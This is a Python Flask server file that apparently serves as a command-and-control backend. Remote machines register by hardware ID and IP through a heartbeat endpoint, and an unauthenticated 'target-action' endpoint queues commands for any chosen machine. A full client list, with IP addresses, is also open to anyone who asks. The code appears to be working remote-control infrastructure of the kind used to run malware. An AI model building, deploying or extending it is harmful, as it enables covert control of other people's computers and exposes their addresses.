import os
import json
from flask import Flask, render_template, request, jsonify
import firebase_admin
from firebase_admin import credentials, db

app = Flask(__name__)

if not firebase_admin._apps:
    firebase_config_str = os.environ.get('FIREBASE_CONFIG_JSON')
    if not firebase_config_str:
        raise ValueError("CRITICAL: FIREBASE_CONFIG_JSON environment variable is missing!")
    
    cred_dict = json.loads(firebase_config_str)
    cred = credentials.Certificate(cred_dict)
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://vipchaetos-default-rtdb.firebaseio.com/'
    })

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.get_json(silent=True) or request.form
        hwid = data.get('hwid')
        if not hwid:
            return jsonify({"status": "error", "message": "Missing HWID"}), 400
            
        if request.headers.get('X-Forwarded-For'):
            ip_addr = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        else:
            ip_addr = request.remote_addr

        ref = db.reference(f'clients/{hwid}')
        client_data = ref.get() or {}
        
        update_payload = {
            'ip': ip_addr,
            'status': 'ONLINE',
            'last_seen': 'Active Live'
        }
        
        if 'pending_action' not in client_data:
            update_payload['pending_action'] = ''

        ref.update(update_payload)
        return jsonify({"status": "registered", "assigned_hwid": hwid})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/clients', methods=['GET'])
def get_clients():
    try:
        ref = db.reference('clients')
        clients_data = ref.get() or {}
        return jsonify(clients_data)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/target-action', methods=['POST', 'GET'])
@app.route('/target-action', methods=['POST', 'GET'])
@app.route('/action', methods=['POST', 'GET'])
def target_action():
    try:
        data = request.get_json(silent=True)
        if not data:
            data = request.form.to_dict()
        
        hwid = data.get('hwid')
        action = data.get('action')

        if not hwid or not action:
            return jsonify({"status": "error", "message": "Invalid HWID or action."}), 400

        ref = db.reference(f'clients/{hwid}')
        ref.update({'pending_action': action})

        return jsonify({"status": "success", "message": f"Action '{action}' successfully queued for {hwid}!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)